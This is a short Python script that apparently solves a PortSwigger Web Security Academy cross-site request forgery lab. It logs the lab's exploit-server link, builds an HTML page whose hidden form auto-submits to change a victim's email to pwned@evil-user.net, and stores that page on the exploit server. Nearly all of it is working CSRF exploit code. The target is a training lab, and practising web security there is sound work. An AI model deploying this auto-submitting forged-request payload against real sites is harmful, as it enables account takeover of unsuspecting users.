
import requests
import sys
import bs4
from bs4 import BeautifulSoup


# A https://portswigger.net/web-security/csrf/lab-no-defenses
#   1) Logging into site with wiener/peter,
#   2) Click on Change Email, Submit change and see URL it hits
#   3) Visit exploit server to store HTML that performs automatic form submission
# Change POST to GET for lab-token-validation-depends-on-request-method

import requests
import sys
from bs4 import BeautifulSoup

site = 'ac3b1fe11e2d60b0c0291581003f00a0.web-security-academy.net'

s = requests.Session()
url = f'https://{site}/login'

resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

exploit_html = f'''<html>
  <body>
	<form action="https://{site}/my-account/change-email" method="POST">
  	<input type="hidden" name="email" value="pwned@evil-user.net" />
	</form>
	<script>
  	document.forms[0].submit();
	</script>
  </body>
</html>'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

resp = s.post(exploit_url, data=formData)





